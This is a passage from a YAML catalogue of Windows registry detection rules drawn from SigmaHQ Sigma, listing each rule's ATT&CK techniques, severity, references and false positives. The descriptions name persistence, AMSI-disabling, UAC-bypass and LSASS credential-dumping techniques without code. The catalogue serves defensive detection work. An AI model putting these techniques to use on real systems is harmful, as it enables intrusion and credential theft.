  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://outflank.nl/blog/2018/01/16/hunting-for-evil-detect-macros-being-executed/
  - http://az4n6.blogspot.com/2016/02/more-on-trust-records-macros-and.html
  - https://twitter.com/inversecos/status/1494174785621819397
  false_positives:
  - This will alert on legitimate macro usage as well, additional tuning is required
  notes: ''
- detection_id: 277efb8f-60be-4f10-b4d3-037802f37167
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_persistence_recycle_bin.yml
  name: Registry Persistence Mechanisms in Recycle Bin
  description: Detects persistence registry keys for Recycle Bin
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547
  time_window: ''
  references:
  - https://github.com/vxunderground/VXUG-Papers/blob/751edb8d50f95bd7baa730adf2c6c3bb1b034276/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf
  - https://persistence-info.github.io/Data/recyclebin.html
  - https://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a54f842a-3713-4b45-8c84-5f136fdebd3c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_portproxy_registry_key.yml
  name: New PortProxy Registry Entry Added
  description: Detects the modification of the PortProxy registry key which is used
    for port forwarding.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html
  - https://adepts.of0x.cc/netsh-portproxy-code/
  - https://www.dfirnotes.net/portproxy_detection/
  false_positives:
  - WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)
  - Synergy Software KVM (https://symless.com/synergy)
  notes: ''
- detection_id: 5b175490-b652-4b02-b1de-5b5b4083c5f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_redmimicry_winnti_reg.yml
  name: RedMimicry Winnti Playbook Registry Manipulation
  description: Detects actions caused by the RedMimicry Winnti playbook
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://redmimicry.com
  false_positives:
  - Unknown
  notes: ''
- detection_id: b98968aa-dbc0-4a9c-ac35-108363cbf8d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_runkey_winekey.yml
  name: WINEKEY Registry Modification
  description: Detects potential malicious modification of run keys by winekey or
    team9 backdoor
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: c74d7efc-8826-45d9-b8bb-f04fac9e4eff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_runonce_persistence.yml
  name: Run Once Task Configuration in Registry
  description: Rule to detect the configuration of Run Once registry key. Configured
    payload can be run by runonce.exe /AlternateShellStartup
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/pabraeken/status/990717080805789697
  - https://lolbas-project.github.io/lolbas/Binaries/Runonce/
  false_positives:
  - Legitimate modification of the registry key by legitimate program
  notes: ''
- detection_id: 152f3630-77c1-4284-bcc0-4cc68ab2f6e7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_shell_open_keys_manipulation.yml
  name: Shell Open Registry Keys Manipulation
  description: Detects the shell open key manipulation (exefile and ms-settings) used
    for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe,
    slui.exe via registry keys (e.g. UACMe 33 or 62)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.001
  - T1548.002
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - attack.t1546.001
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  - https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
  - https://github.com/RhinoSecurityLabs/Aggressor-Scripts/tree/master/UACBypass
  - https://tria.ge/211119-gs7rtshcfr/behavioral2 [Lokibot sample from Nov 2021]
  false_positives:
  - Unknown
  notes: ''
- detection_id: 55e29995-75e7-451a-bef0-6225e2f13597
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_silentprocessexit_lsass.yml
  name: Potential Credential Dumping Via LSASS SilentProcessExit Technique
  description: Detects changes to the Registry in which a monitor program gets registered
    to dump the memory of the lsass.exe process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/
  - https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_ssp_added_lsa_config.yml
  name: Security Support Provider (SSP) Added to LSA Configuration
  description: 'Detects the addition of a SSP to the registry. Upon a reboot or API
    call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.005
  time_window: ''
  references:
  - https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/
  - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/persistence/Install-SSP.ps1#L157
  false_positives:
  - Unknown
  notes: ''
- detection_id: baca5663-583c-45f9-b5dc-ea96a22ce542
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_stickykey_like_backdoor.yml
  name: Sticky Key Like Backdoor Usage - Registry
  description: Detects the usage and installation of a backdoor that uses an option
    to register a malicious debugger for built-in tools that are accessible in the
    login screen
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.008
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.008
  - car.2014-11-003
  - car.2014-11-008
  time_window: ''
  references:
  - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/
  - https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9577edbb-851f-4243-8c91-1d5b50c1a39b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_susp_atbroker_change.yml
  name: Atbroker Registry Change
  description: Detects creation/modification of Assistive Technology applications
    and persistence with usage of 'at'
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1218
  - T1547
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1218
  - attack.persistence
  - attack.t1547
  time_window: ''
  references:
  - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/
  - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/
  false_positives:
  - Creation of non-default, legitimate at usage
  notes: ''
- detection_id: 9c5037d1-c568-49b3-88c7-9846a5bdc2be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_susp_download_run_key.yml
  name: Suspicious Run Key from Download
  description: Detects the suspicious RUN keys created by software located in Download
    or temporary Outlook/Internet Explorer directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Software installers downloaded and used by users
  notes: ''
- detection_id: b3503044-60ce-4bf4-bbcb-e3db98788823
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_susp_lsass_dll_load.yml
  name: DLL Load via LSASS
  description: Detects a method to load DLL via LSASS process using an undocumented
    Registry key
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1547.008
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1547.008
  time_window: ''
  references:
  - https://blog.xpnsec.com/exploring-mimikatz-part-1/
  - https://twitter.com/SBousseaden/status/1183745981189427200
  false_positives:
  - Unknown
  notes: ''
- detection_id: 62120148-6b7a-42be-8b91-271c04e281a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_susp_mic_cam_access.yml
  name: Suspicious Camera and Microphone Access
  description: Detects Processes accessing the camera and microphone from suspicious
    folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1123
  - T1125
  tags:
  - attack.collection
  - attack.t1125
  - attack.t1123
  time_window: ''
  references:
  - https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072
  false_positives:
  - Unlikely, there could be conferencing software running from a Temp folder accessing
    the devices
  notes: ''
- detection_id: 7f4c43f9-b1a5-4c7d-b24a-b41bf3a3ebf2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_susp_process_registry_modification.yml
  name: Registry Tampering by Potentially Suspicious Processes
  description: 'Detects suspicious registry modifications made by suspicious processes
    such as script engine processes such as WScript, or CScript etc.

    These processes are rarely used for legitimate registry modifications, and their
    activity may indicate an attempt to modify the registry

    without using standard tools like regedit.exe or reg.exe, potentially for evasion
    and persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.005
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.execution
  - attack.t1112
  - attack.t1059.005
  time_window: ''
  references:
  - https://www.nextron-systems.com/2025/07/29/detecting-the-most-popular-mitre-persistence-method-registry-run-keys-startup-folder/
  - https://www.linkedin.com/posts/mauricefielenbach_livingofftheland-redteam-persistence-activity-7344801774182051843-TE00/
  false_positives:
  - Some legitimate admin or install scripts may use these processes for registry
    modifications.
  notes: ''
- detection_id: 4d431012-2ab5-4db7-a84e-b29809da2172
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_set_enable_anonymous_connection.yml
  name: Enable Remote Connection Between Anonymous Computer - AllowAnonymousCallback
  description: Detects enabling of the "AllowAnonymousCallback" registry value, which
    allows a remote connection between computers that do not have a trust relationship.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/wmisdk/connecting-to-wmi-remotely-starting-with-vista
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 1547e27c-3974-43e2-a7d7-7f484fb928ec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_add_load_service_in_safe_mode.yml
  name: Registry Persistence via Service in Safe Mode
  description: Detects the modification of the registry to allow a driver or service
    to persist in Safe Mode.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-33---windows-add-registry-value-to-load-service-in-safe-mode-without-network
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-34---windows-add-registry-value-to-load-service-in-safe-mode-with-network
  false_positives:
  - Unknown
  notes: ''
- detection_id: 944e8941-f6f6-4ee8-ac05-1c224e923c0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_add_port_monitor.yml
  name: Add Port Monitor Persistence in Registry
  description: 'Adversaries may use port monitors to run an attacker supplied DLL
    during system boot for persistence or privilege escalation.

    A port monitor can be set through the AddMonitor API call to set a DLL to be loaded
    at startup.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.010
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.010
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.010/T1547.010.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 092af964-4233-4373-b4ba-d86ea2890288
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_aedebug_persistence.yml
  name: Add Debugger Entry To AeDebug For Persistence
  description: Detects when an attacker adds a new "Debugger" value to the "AeDebug"
    key in order to achieve persistence which will get invoked when an application
    crashes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/aedebug.html
  - https://learn.microsoft.com/en-us/windows/win32/debug/configuring-automatic-debugging
  false_positives:
  - Legitimate use of the key to setup a debugger. Which is often the case on developers
    machines
  notes: ''
- detection_id: 37b437cf-3fc5-4c8e-9c94-1d7c9aff842b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_allow_rdp_remote_assistance_feature.yml
  name: Allow RDP Remote Assistance Feature
  description: Detect enable rdp feature to allow specific user to rdp connect on
    the targeted machine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md
  false_positives:
  - Legitimate use of the feature (alerts should be investigated either way)
  notes: ''
- detection_id: 160d2780-31f7-4922-8b3a-efce30e63e96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_amsi_com_hijack.yml
  name: Potential AMSI COM Server Hijacking
  description: Detects changes to the AMSI come server registry key in order disable
    AMSI scanning functionalities. When AMSI attempts to starts its COM component,
    it will query its registered CLSID and return a non-existent COM server. This
    causes a load failure and prevents any scanning methods from being accessed, ultimately
    rendering AMSI useless
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
  - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#amsi-comreg-bypass
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9df5f547-c86a-433e-b533-f2794357e242
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_classes.yml
  name: Classes Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: f59c3faf-50f3-464b-9f4c-1b67ab512d99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_common.yml
  name: Common Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  - https://persistence-info.github.io/Data/userinitmprlogonscript.html
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: f674e36a-4b91-431e-8aef-f8a96c2aca35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentcontrolset.yml
  name: CurrentControlSet Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: 20f0ee37-5942-4e45-b7d5-c5b5db9df5cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentversion.yml
  name: CurrentVersion Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: cbf93e5d-ca6c-4722-8bea-e9119007c248
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentversion_nt.yml
  name: CurrentVersion NT Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: a80f662f-022f-4429-9b8c-b1a41aaa6688
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_internet_explorer.yml
  name: Internet Explorer Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: baecf8fb-edbf-429f-9ade-31fc3f22b970
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_office.yml
  name: Office Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: 046218bd-e0d8-4113-a3c3-895a12b2b298
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_session_manager.yml
  name: Session Manager Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.009
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - attack.t1546.009
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_system_scripts.yml
  name: System Scripts Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
